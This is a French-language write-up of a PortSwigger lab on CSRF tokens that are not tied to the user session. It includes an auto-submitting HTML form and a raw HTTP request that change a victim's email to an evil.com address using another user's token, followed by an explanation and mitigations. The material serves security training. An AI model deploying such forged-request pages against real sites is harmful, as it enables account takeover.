# Challenge 4 : CSRF - Token Not Tied to User Session

**URL** : [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

## Exploitation

Paramètre vulnérable : `csrf` (jeton CSRF non lié à la session)

### Étape 1 : Récupérer un jeton CSRF valide

Se connecter en **wiener**, aller sur *My account*, récupérer le jeton dans le HTML :

```
<input type="hidden" name="csrf" value="TOKEN">
```

Aucune action n’est envoyée, donc le jeton n’est pas consommé.

### Étape 2 : Tester le jeton sur le compte carlos

Envoyer une requête de changement d’email avec :

* le **cookie de session de carlos**
* le **jeton CSRF de wiener**

Le serveur accepte → le jeton n'est pas lié à la session.

### Étape 3 : Créer un exploit CSRF

Formulaire auto-soumis :

```html
<html>
  <body>
    <form action="https://LABID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="megaowned999@evil.com">
      <input type="hidden" name="csrf" value="j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```

### Étape 4 : Livrer l'exploit

Uploader le payload sur l’exploit server, puis cliquer sur **Deliver exploit to victim**.
L’email de carlos est modifié → challenge résolu.

## Requête HTTP

```http
POST /my-account/change-email HTTP/1.1
Host: LABID.web-security-academy.net
Cookie: session=<cookie_carlos>
Content-Type: application/x-www-form-urlencoded

email=megaowned999%40evil.com&csrf=j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI
```

## Explication

Le serveur vérifie uniquement la **valeur** du jeton CSRF, mais pas la **session à laquelle il appartient**.
Un jeton généré pour wiener peut donc être utilisé dans la session de carlos, permettant d'exécuter une action à sa place.

## Mesures de sécurisation

1. Lier chaque jeton CSRF à la session utilisateur
2. Régénérer le jeton à chaque chargement de formulaire
3. Vérifier que le jeton appartient bien à l’utilisateur qui envoie la requête
4. Expirer les jetons après utilisation

---

Date : [DATE]
Statut : [ ] Résolu
